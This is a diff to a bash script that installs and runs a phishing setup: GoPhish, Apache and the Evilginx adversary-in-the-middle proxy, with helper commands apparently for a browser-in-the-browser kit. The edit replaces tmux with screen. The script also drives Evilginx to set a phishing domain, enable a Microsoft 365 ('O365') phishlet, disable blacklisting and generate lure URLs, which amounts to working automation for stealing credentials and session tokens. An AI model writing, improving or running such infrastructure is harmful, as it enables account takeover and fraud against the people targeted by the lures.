@@ -93,7 +93,7 @@ install_dependencies() {
         apache2
         certbot
         python3-certbot-apache
-        tmux
+        screen
         net-tools
         ufw
         sqlite3
@@ -597,7 +597,7 @@ configure_firewall() {
 create_services() {
     section "STEP 12: Creating Systemd Services"
 
-    info "NOTE: Evilginx will run in tmux (as per official README)"
+    info "NOTE: Evilginx will run in screen session (more stable than systemd)"
     info "Skipping Evilginx systemd service creation..."
 
     info "Creating GoPhish service..."
@@ -639,18 +639,18 @@ echo "Starting all services..."
 systemctl start apache2
 systemctl start gophish
 
-# Start Evilginx in tmux if not running
-if ! tmux has-session -t evilginx 2>/dev/null; then
-    echo "Starting Evilginx in tmux..."
-    tmux new-session -d -s evilginx "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -g /root/.evilginx"
+# Start Evilginx in screen if not running
+if ! screen -ls | grep -q "\.evilginx\s"; then
+    echo "Starting Evilginx in screen..."
+    screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -g /root/.evilginx"
 else
-    echo "Evilginx tmux session already running"
+    echo "Evilginx screen session already running"
 fi
 
 echo "All services started"
 systemctl status apache2 gophish --no-pager
 echo ""
-echo "Evilginx status: $(tmux has-session -t evilginx 2>/dev/null && echo 'Running in tmux' || echo 'Not running')"
+echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
 EOF
     chmod +x /usr/local/bin/bitb-start
 
@@ -661,10 +661,10 @@ echo "Stopping all services..."
 systemctl stop apache2
 systemctl stop gophish
 
-# Kill Evilginx tmux session
-if tmux has-session -t evilginx 2>/dev/null; then
-    echo "Stopping Evilginx tmux session..."
-    tmux kill-session -t evilginx
+# Kill Evilginx screen session
+if screen -ls | grep -q "\.evilginx\s"; then
+    echo "Stopping Evilginx screen session..."
+    screen -S evilginx -X quit
 fi
 
 echo "All services stopped"
@@ -678,17 +678,18 @@ echo "Restarting all services..."
 systemctl restart apache2
 systemctl restart gophish
 
-# Restart Evilginx tmux session
-if tmux has-session -t evilginx 2>/dev/null; then
+# Restart Evilginx screen session
+if screen -ls | grep -q "\.evilginx\s"; then
     echo "Restarting Evilginx..."
-    tmux kill-session -t evilginx
+    screen -S evilginx -X quit
+    sleep 2
 fi
-tmux new-session -d -s evilginx "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -g /root/.evilginx"
+screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -g /root/.evilginx"
 
 echo "All services restarted"
 systemctl status apache2 gophish --no-pager
 echo ""
-echo "Evilginx status: $(tmux has-session -t evilginx 2>/dev/null && echo 'Running in tmux' || echo 'Not running')"
+echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
 EOF
     chmod +x /usr/local/bin/bitb-restart
 
@@ -704,10 +705,10 @@ echo "=== GoPhish ==="
 systemctl status gophish --no-pager | head -n 3
 echo ""
 echo "=== Evilginx ==="
-if tmux has-session -t evilginx 2>/dev/null; then
-    echo "Status: Running in tmux session 'evilginx'"
-    echo "To access: tmux attach -t evilginx"
-    echo "To detach: Press Ctrl+B then D"
+if screen -ls | grep -q "\.evilginx\s"; then
+    echo "Status: Running in screen session 'evilginx'"
+    echo "To access: screen -r evilginx"
+    echo "To detach: Press Ctrl+A then D"
 else
     echo "Status: Not running"
     echo "To start: bitb-start"
@@ -726,12 +727,12 @@ case $SERVICE in
         tail -n 100 /var/log/apache2/error.log
         ;;
     evilginx)
-        echo "=== Evilginx Tmux Session ==="
-        echo "Evilginx runs in tmux. To view live:"
-        echo "  tmux attach -t evilginx"
+        echo "=== Evilginx Screen Session ==="
+        echo "Evilginx runs in screen. To view live:"
+        echo "  screen -r evilginx"
         echo ""
-        echo "Tmux session status:"
-        tmux has-session -t evilginx 2>/dev/null && echo "  Running" || echo "  Not running"
+        echo "Screen session status:"
+        screen -ls | grep -q "\.evilginx\s" && echo "  Running" || echo "  Not running"
         ;;
     gophish)
         echo "=== GoPhish Logs ==="
@@ -742,8 +743,8 @@ case $SERVICE in
         tail -n 50 /var/log/apache2/error.log
         echo ""
         echo "=== Evilginx ==="
-        echo "Tmux session: $(tmux has-session -t evilginx 2>/dev/null && echo 'Running' || echo 'Not running')"
-        echo "To access: tmux attach -t evilginx"
+        echo "Screen session: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running' || echo 'Not running')"
+        echo "To access: screen -r evilginx"
         echo ""
         echo "=== GoPhish Logs ==="
         journalctl -u gophish -n 50 --no-pager
@@ -775,48 +776,49 @@ start_services() {
     info "Evilginx will be started and configured in the next step..."
 }
 
-# Start and configure Evilginx in tmux
+# Start and configure Evilginx in screen
 start_and_configure_evilginx() {
     section "STEP 15: Starting and Configuring Evilginx"
 
-    info "Starting Evilginx in tmux session (as per official README)..."
+    info "Starting Evilginx in screen session (more stable than tmux)..."
 
-    # Kill any existing evilginx tmux session
-    tmux kill-session -t evilginx 2>/dev/null || true
+    # Kill any existing evilginx screen session
+    screen -S evilginx -X quit 2>/dev/null || true
+    sleep 1
 
-    # Start Evilginx in detached tmux session
-    tmux new-session -d -s evilginx "cd ${EVILGINX_DIR} && ./evilginx -p ${EVILGINX_DIR}/phishlets -g /root/.evilginx"
+    # Start Evilginx in detached screen session
+    screen -dmS evilginx bash -c "cd ${EVILGINX_DIR} && ./evilginx -p ${EVILGINX_DIR}/phishlets -g /root/.evilginx"
 
     info "Waiting for Evilginx to initialize..."
-    sleep 5
+    sleep 8
 
     info "Configuring Evilginx phishlet..."
 
-    # Send configuration commands to tmux session
-    tmux send-keys -t evilginx "config domain ${DOMAIN}" C-m
-    sleep 1
-
-    tmux send-keys -t evilginx "config ipv4 external" C-m
-    sleep 1
-
-    tmux send-keys -t evilginx "blacklist noadd" C-m
-    sleep 1
-
-    tmux send-keys -t evilginx "phishlets hostname O365 ${DOMAIN}" C-m
-    sleep 1
-
-    tmux send-keys -t evilginx "phishlets enable O365" C-m
-    sleep 1
-
-    tmux send-keys -t evilginx "lures create O365" C-m
-    sleep 1
-
-    tmux send-keys -t evilginx "lures get-url 0" C-m
+    # Send configuration commands to screen session
+    screen -S evilginx -X stuff "config domain ${DOMAIN}\n"
     sleep 2
 
+    screen -S evilginx -X stuff "config ipv4 external\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "blacklist noadd\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "phishlets hostname O365 ${DOMAIN}\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "phishlets enable O365\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "lures create O365\n"
+    sleep 2
+
+    screen -S evilginx -X stuff "lures get-url 0\n"
+    sleep 3
+
     log "Evilginx started and configured successfully"
-    info "To access Evilginx console: tmux attach -t evilginx"
-    info "To detach from console: Press Ctrl+B then D"
+    info "To access Evilginx console: screen -r evilginx"
+    info "To detach from console: Press Ctrl+A then D"
 }
 
 # Display installation summary
